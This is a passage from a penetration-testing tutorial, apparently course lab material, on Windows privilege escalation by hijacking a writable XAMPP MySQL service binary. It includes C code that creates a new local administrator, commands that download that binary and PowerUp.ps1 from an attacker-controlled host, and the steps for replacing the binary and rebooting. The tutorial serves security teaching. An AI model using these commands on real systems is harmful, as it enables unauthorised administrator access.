### Listing 411 - List of Services with Binary Path

Based on the output in Listing 411, the two XAMPP services, Apache2.4 and MySQL, stand out because their binaries are located in the `C:\xampp\` directory rather than the standard `C:\Windows\System32` directory. This indicates that these services are user-installed, and the software developer is responsible for the directory structure and permissions. These circumstances make these services potentially vulnerable to binary hijacking.

### Enumerating Permissions on Service Binaries

Next, we will enumerate the permissions on both service binaries. We can use either the traditional `icacls` Windows utility or the PowerShell `Get-ACL` cmdlet. For this example, we will use `icacls` as it is compatible with both PowerShell and the Windows command line.

The `icacls` utility provides a list of principals and their permission masks. The most relevant permissions and their corresponding masks are:

| Mask | Permissions          |
|------|----------------------|
| F    | Full access           |
| M    | Modify access         |
| RX   | Read and execute access |
| R    | Read-only access      |
| W    | Write-only access     |

**References:**
- [Microsoft Documentation (2022)](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2)
- [Microsoft Documentation (2022)](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)

### Listing 412 - icacls Permissions Mask

Let's use `icacls` to check the permissions on the Apache binary `httpd.exe`.

```powershell
PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
NT AUTHORITY\SYSTEM:(F)
BUILTIN\Users:(RX)
NT AUTHORITY\Authenticated Users:(RX)
Successfully processed 1 files; Failed processing 0 files
```

### Listing 413 - Permissions of httpd.exe

As a member of the built-in Users group, Dave has only Read and Execute (RX) rights on `httpd.exe`. This means he cannot replace the file with a malicious binary.

### Checking MySQL Binary Permissions

Next, let's check the permissions on `mysqld.exe` from the MySQL service.

```powershell
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
BUILTIN\Administrators:(F)
BUILTIN\Users:(F)
Successfully processed 1 files; Failed processing 0 files
```

### Listing 414 - Permissions of mysqld.exe

The output shows that members of the Users group have Full Access (F) permissions, allowing them to write to and modify the binary. This permission was set explicitly, as indicated by the absence of the inherited indicator (I). Administrators often set Full Access permissions when configuring a service to avoid permission issues, but this creates a security risk.

### Creating a Malicious Binary

Let's create a small binary on Kali Linux that will add a new user named `dave2` to the local Administrators group. The following C code will be used:

```c
#include <stdlib.h>

int main() {
    int i;
    i = system("net user dave2 password123! /add");
    i = system("net localgroup administrators dave2 /add");
    return 0;
}
```

### Cross-Compiling the Code

We will cross-compile this code on our Kali machine using `mingw-64` as follows:

```bash
kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### Transferring and Replacing the Binary

Once `adduser.exe` is compiled, we transfer it to the target machine and replace the original `mysqld.exe` binary.

```powershell
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

### Restarting the Service

To execute the binary through the service, we need to restart it. However, Dave does not have sufficient permissions to stop the service.

```powershell
PS C:\Users\dave> net stop mysql
System error 5 has occurred.
Access is denied.
```

### Checking the Startup Type

Since we cannot manually restart the service, we check the startup type of the MySQL service:

```powershell
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
Name StartMode
---- ---------
mysql Auto
```

The service is set to start automatically after a reboot. To initiate a reboot, Dave needs the `SeShutDownPrivilege` privilege.

### Checking Reboot Privileges

```powershell
PS C:\Users\dave> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
...
```

Although the `SeShutdownPrivilege` is listed as disabled, it is available to the user. We can issue a reboot with the `shutdown` command:

```powershell
PS C:\Users\dave> shutdown /r /t 0
```

### Verifying the Exploit

After the reboot, we connect again as Dave via RDP and verify if the new user `dave2` has been added to the local Administrators group.

```powershell
PS C:\Users\dave> Get-LocalGroupMember administrators
ObjectClass Name PrincipalSource
----------- ---- ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\offsec        Local
```

### Using PowerUp.ps1

To verify the vulnerability, we use the `PowerUp.ps1` script. First, we copy the script to Kaliâ€™s home directory and serve it with a Python3 web server.

```bash
kali@kali:~$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

On the target machine, we download and import the script:

```powershell
PS C:\Users\dave> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
PS C:\Users\dave> powershell -ep bypass
PS C:\Users\dave> . .\PowerUp.ps1
PS C:\Users\dave> Get-ModifiableServiceFile
...
ServiceName : mysql
Path : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName : LocalSystem
AbuseFunction : Install-ServiceBinary -Name 'mysql'
CanRestart : False
```

### Analyzing the Function

The `Install-ServiceBinary` function throws an error due to the path argument in the service binary. We can manually analyze the function to understand why:

```powershell
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
PS C:\Users\dave> $ModifiableFiles
ModifiablePath IdentityReference Permissions
-------------- ----------------- -----------
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users {WriteOwner, Delete, WriteAttributes, Synchronize...}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
PS C:\Users\dave> $ModifiableFiles
ModifiablePath IdentityReference Permissions
-------------- ----------------- -----------
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal
PS C:\Users\dave> $ModifiableFiles
```

### Conclusion

In this section, we enumerated service binaries and their permissions, identified a vulnerable service, and exploited it to escalate privileges. We also demonstrated the importance of manual analysis even when using automated tools like `PowerUp.ps1`.

### 16.2.2 Service DLL Hijacking

Replacing the binary of a service is an effective way to attempt privilege escalation on Windows systems. However, users often do not have the necessary permissions to replace these binaries. In such cases, service DLL hijacking can be an alternative approach.